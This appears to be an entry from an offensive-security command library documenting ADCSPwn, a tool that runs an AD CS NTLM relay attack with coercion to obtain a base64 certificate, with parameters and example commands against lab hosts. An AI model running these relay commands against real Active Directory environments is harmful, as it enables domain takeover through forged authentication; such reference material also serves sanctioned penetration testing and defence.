---
id: 1cce9fb7-aacd-40a7-b853-8b3c2c82bd33
name: adcspwn-relay-attack
type: command
executor: bash
data: >-
  adcspwn.exe --adcs $_CA_SERVER --remote $_TARGET_MACHINE --port $_LISTEN_PORT
  --output $_OUTPUT_FILE
output: null
created_at: '2023-04-06T03:56:05.989619+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - ad-cs
  - relay
  - coercion
verified: true
validated: true
---

# adcspwn-relay-attack

## Command

```bash
adcspwn.exe --adcs $_CA_SERVER --remote $_TARGET_MACHINE --port $_LISTEN_PORT --output $_OUTPUT_FILE
```

## Description

Executes an integrated AD CS relay attack with built-in coercion to generate a base64 certificate.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --adcs $_CA_SERVER | AD CS server address | Yes |
| --remote $_TARGET_MACHINE | Target for coercion | Yes |
| --port $_LISTEN_PORT | Local listen port | No |
| --output $_OUTPUT_FILE | Base64 cert output file | No |
| --username $_USERNAME | Non-domain username | No |
| --password $_PASSWORD | Non-domain password | No |
| --dc $_DC | Domain controller for LDAP | No |
| --unc $_UNC_PATH | Custom UNC for coercion | No |

## Examples

### Basic

```bash
adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001
```

### With Output

```bash
adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\Temp\cert_b64.txt
```

## Expected Output

[+] Certificate generated: MIIRdQIBAzC... (base64 in file or console)

## Related

- [[procedures/AD-CS-Relay-Attack-with-Rubeus-and-PetitPotam]]
- [[tools/ADCSPwn]]
